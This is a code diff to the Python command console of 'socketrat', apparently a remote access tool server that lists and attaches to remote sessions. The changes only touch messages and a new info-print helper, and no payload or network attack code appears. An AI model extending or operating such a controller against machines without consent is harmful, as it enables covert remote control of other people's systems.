@@ -91,7 +91,7 @@ class ThreadingRATServer(socketserver.ThreadingMixIn, RATServer):
 
 
 class RATServerCmd(cmd.Cmd):
-    intro = 'Welcome to the socketrat shell. Type help or ? to list commands.\n'
+    intro = 'Type help or ? to list commands.\n'
     prompt = '(socketrat) '
     ruler = '-'
     nohelp = '*** {}'.format(Style.BRIGHT + Fore.RED + 'No help on %s' + Style.RESET_ALL)
@@ -133,6 +133,11 @@ class RATServerCmd(cmd.Cmd):
     def default(self, line):
         self.error('Unknown syntax: {}'.format(line))
 
+    def info(self, msg):
+        print('* {}'.format(
+            Style.BRIGHT + Fore.BLUE + msg.capitalize() + Style.RESET_ALL,
+        ))
+
     def error(self, msg):
         print('*** {}'.format(
             Style.BRIGHT + Fore.RED + msg.capitalize() + Style.RESET_ALL,
@@ -163,7 +168,6 @@ class RATServerCmd(cmd.Cmd):
 
     def do_exit(self, line):
         '''Exit the shell.'''
-        print('Thank you for using socketrat')
         return True
 
     def do_interact(self, line):
@@ -178,13 +182,14 @@ class RATServerCmd(cmd.Cmd):
         session = self.sessions[sessid]
         sh = self.SessionCmd(session)
 
-        intro = 'Interacting with session {} ...'.format(sessid)
+        #intro = 'Interacting with session {} ...'.format(sessid)
         #intro += ' Type help or ? to list commands.\n'
+        intro = ''
 
+        self.info('Interacting with session {} ...'.format(sessid))
         sh.cmdqueue.append('info')
-        sh.cmdloop(intro=intro)
-        print('Detached from session {}.'.format(sessid))
-        print()
+        sh.cmdloop()
+        self.info('Detached from session {}.\n'.format(sessid))
 
 
 if __name__ == '__main__':
@@ -215,12 +220,12 @@ if __name__ == '__main__':
         t = threading.Thread(target=server.serve_forever)
         t.daemon = True
         t.start()
-        print('Serving on {} port {} ...'.format(host, port))
 
         sh = RATServerCmd(server)
+        sh.info('Serving on {} port {} ...'.format(host, port))
         try:
             sh.cmdloop()
         finally:
-            print('Stopping server ...')
+            sh.info('Stopping server ...')
             server.shutdown()
 
